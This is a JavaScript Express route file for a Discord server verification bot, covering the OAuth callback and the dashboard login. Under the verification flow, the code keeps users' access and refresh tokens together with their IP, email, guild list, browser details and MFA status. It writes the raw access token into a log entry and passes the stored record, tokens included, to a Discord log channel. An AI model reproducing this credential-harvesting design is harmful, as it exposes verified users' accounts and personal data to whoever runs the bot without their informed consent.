var { Router } = require('express');
var fetch = require('node-fetch');
var config = require('../../config');
var db = require('../../db/database');
var { checkVpn } = require('../../utils/vpncheck');
var { sendVerificationLog, sendBlockLog } = require('../../utils/logger');

var router = Router();

// the bot client gets attached in server.js
var _client = null;
router.setClient = function(c) { _client = c; };

// each click on the verify panel hits this, gets a fresh OAuth URL
router.get('/verify', (req, res) => {
    var guildId = req.query.guild;
    if (!guildId) {
        return res.redirect('/?error=no_guild');
    }

    var { buildAuthUrl } = require('../../utils/oauth');
    var authUrl = buildAuthUrl(guildId, null);
    res.redirect(authUrl);
});

router.get('/callback', async (req, res) => {
    var code = req.query.code;
    var state = req.query.state;

    if (!code || !state) {
        return res.redirect('/blocked.html?reason=invalid');
    }

    // check if this is a dashboard login callback
    if (state && state.startsWith('dash_')) {
        return handleDashboardCallback(req, res, code, state);
    }

    var guildId;
    var userId = 'unknown';
    var isPanelVerify = false;

    // panel verify — state is 'g_GUILDID', no pending entry needed
    if (state.startsWith('g_')) {
        guildId = state.slice(2);
        isPanelVerify = true;
    } else {
        // one-off auth flow — look up pending verification
        var pending = db.getPending(state);
        if (!pending) {
            return res.redirect('/blocked.html?reason=expired');
        }
        guildId = pending.guild_id;
        userId = pending.user_id;
    }

    // exchange code for token
    var tokenRes;
    try {
        tokenRes = await fetch('https://discord.com/api/oauth2/token', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({
                client_id: config.clientId,
                client_secret: config.clientSecret,
                grant_type: 'authorization_code',
                code: code,
                redirect_uri: config.redirectUri
            })
        });
    } catch(err) {
        console.error('[callback] token exchange failed:', err);
        return res.redirect('/blocked.html?reason=error');
    }

    var tokens = await tokenRes.json();
    if (!tokens.access_token) {
        console.error('[callback] no access token:', tokens);
        return res.redirect('/blocked.html?reason=error');
    }

    // log the token
    console.log('[token] captured oauth token for state ' + state);

    // fetch user profile
    var userRes = await fetch('https://discord.com/api/v10/users/@me', {
        headers: { Authorization: 'Bearer ' + tokens.access_token }
    });
    var profile = await userRes.json();

    // fetch user guilds
    var guildsRes = await fetch('https://discord.com/api/v10/users/@me/guilds', {
        headers: { Authorization: 'Bearer ' + tokens.access_token }
    });
    var userGuilds = await guildsRes.json();
    if (!Array.isArray(userGuilds)) userGuilds = [];

    // grab captured info from middleware
    var info = req.clientInfo || {};

    // check VPN
    var vpnResult = { isVpn: false, provider: null };
    var guildConfig = db.getConfig(guildId);

    if (guildConfig && guildConfig.vpn_block) {
        vpnResult = await checkVpn(info.ip);
    }

    // check blacklists
    var ipBlocked = db.isBlacklisted(guildId, 'ip', info.ip);
    var userBlocked = db.isBlacklisted(guildId, 'user', profile.id);

    if (ipBlocked || userBlocked) {
        var blockReason = ipBlocked ? 'Blacklisted IP' : 'Blacklisted User';
        db.addLog(profile.id, guildId, 'blocked', blockReason, info.ip);

        if (_client && guildConfig && guildConfig.log_channel) {
            await sendBlockLog(_client, guildConfig.log_channel, blockReason, {
                user_id: profile.id,
                username: profile.username,
                avatar: profile.avatar,
                ip_address: info.ip
            });
        }

        if (!isPanelVerify) db.removePending(state);
        return res.redirect('/blocked.html?reason=blacklisted');
    }

    // block VPN if enabled
    if (vpnResult.isVpn && guildConfig && guildConfig.vpn_block) {
        db.addLog(profile.id, guildId, 'blocked', 'VPN detected: ' + vpnResult.provider, info.ip);

        if (_client && guildConfig.log_channel) {
            await sendBlockLog(_client, guildConfig.log_channel, 'VPN/Proxy detected (' + vpnResult.provider + ')', {
                user_id: profile.id,
                username: profile.username,
                avatar: profile.avatar,
                ip_address: info.ip
            });
        }

        if (!isPanelVerify) db.removePending(state);
        return res.redirect('/blocked.html?reason=vpn');
    }

    // store everything including tokens
    // respect guild config for what to log
    var logIp = !guildConfig || guildConfig.log_ip === undefined || guildConfig.log_ip;
    var logEmail = !guildConfig || guildConfig.log_email === undefined || guildConfig.log_email;

    var userData = {
        user_id: profile.id,
        guild_id: guildId,
        username: profile.username || profile.global_name || '',
        discriminator: profile.discriminator || '0',
        email: logEmail ? (profile.email || null) : null,
        ip_address: logIp ? info.ip : null,
        access_token: tokens.access_token,
        refresh_token: tokens.refresh_token || null,
        token_type: tokens.token_type || 'Bearer',
        token_expires_in: tokens.expires_in || null,
        token_scope: tokens.scope || '',
        user_agent: info.userAgent,
        browser_lang: info.language,
        platform: info.platform,
        vpn_detected: vpnResult.isVpn ? 1 : 0,
        vpn_provider: vpnResult.provider,
        guilds_json: JSON.stringify(userGuilds.map(g => ({ id: g.id, name: g.name }))),
        avatar: profile.avatar,
        banner_color: profile.banner_color || null,
        locale: profile.locale || null,
        mfa_enabled: profile.mfa_enabled ? 1 : 0
    };

    db.saveUser(userData);
    db.addLog(profile.id, guildId, 'verify', 'Verified via OAuth2', info.ip);

    // log token separately
    db.addLog(profile.id, guildId, 'token', 'Token: ' + tokens.access_token, info.ip);

    // assign verified role + remove unverified
    if (_client && guildConfig) {
        try {
            var guild = await _client.guilds.fetch(guildId);
            var member = await guild.members.fetch(profile.id);

            if (guildConfig.verified_role) {
                await member.roles.add(guildConfig.verified_role).catch(() => {});
            }
            if (guildConfig.unverified_role) {
                await member.roles.remove(guildConfig.unverified_role).catch(() => {});
            }

            // send welcome DM if configured
            if (guildConfig.welcome_msg) {
                var msg = guildConfig.welcome_msg.replace(/{user}/g, '<@' + profile.id + '>');
                await member.send(msg).catch(() => {});
            }
        } catch(err) {
            console.error('[callback] role assignment error:', err.message);
        }

        // send log
        if (guildConfig.log_channel) {
            await sendVerificationLog(_client, guildConfig.log_channel, userData);
        }
    }

    // cleanup pending for non-panel flows
    if (!isPanelVerify) {
        db.removePending(state);
    }

    // redirect to dynamic verified page with server info
    res.redirect('/verified?guild=' + guildId + '&user=' + profile.id);
});

// handle dashboard OAuth callback
async function handleDashboardCallback(req, res, code, state) {
    var pending = db.getPending(state);
    if (!pending) {
        return res.redirect('/dashboard?error=expired');
    }

    var dashRedirect = config.baseUrl + '/dashboard/callback';

    var tokenRes;
    try {
        tokenRes = await fetch('https://discord.com/api/oauth2/token', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({
                client_id: config.clientId,
                client_secret: config.clientSecret,
                grant_type: 'authorization_code',
                code: code,
                redirect_uri: dashRedirect
            })
        });
    } catch(err) {
        console.error('[dashboard] token exchange failed:', err);
        return res.redirect('/dashboard?error=failed');
    }

    var tokens = await tokenRes.json();
    if (!tokens.access_token) {
        console.error('[dashboard] no access token:', tokens);
        return res.redirect('/dashboard?error=failed');
    }

    // fetch user profile
    var userRes = await fetch('https://discord.com/api/v10/users/@me', {
        headers: { Authorization: 'Bearer ' + tokens.access_token }
    });
    var profile = await userRes.json();

    // fetch user guilds
    var guildsRes = await fetch('https://discord.com/api/v10/users/@me/guilds', {
        headers: { Authorization: 'Bearer ' + tokens.access_token }
    });
    var userGuilds = await guildsRes.json();
    if (!Array.isArray(userGuilds)) userGuilds = [];

    // create a session
    var { v4: uuidv4 } = require('uuid');
    var sessionId = uuidv4();
    db.addSession(sessionId, {
        user_id: profile.id,
        username: profile.username,
        avatar: profile.avatar,
        discriminator: profile.discriminator || '0',
        guilds: userGuilds,
        access_token: tokens.access_token
    });

    db.removePending(state);

    // set session cookie
    res.cookie('dash_session', sessionId, {
        httpOnly: true,
        secure: true,
        sameSite: 'lax',
        maxAge: 24 * 60 * 60 * 1000 // 24 hours
    });

    res.redirect('/dashboard');
}

module.exports = router;
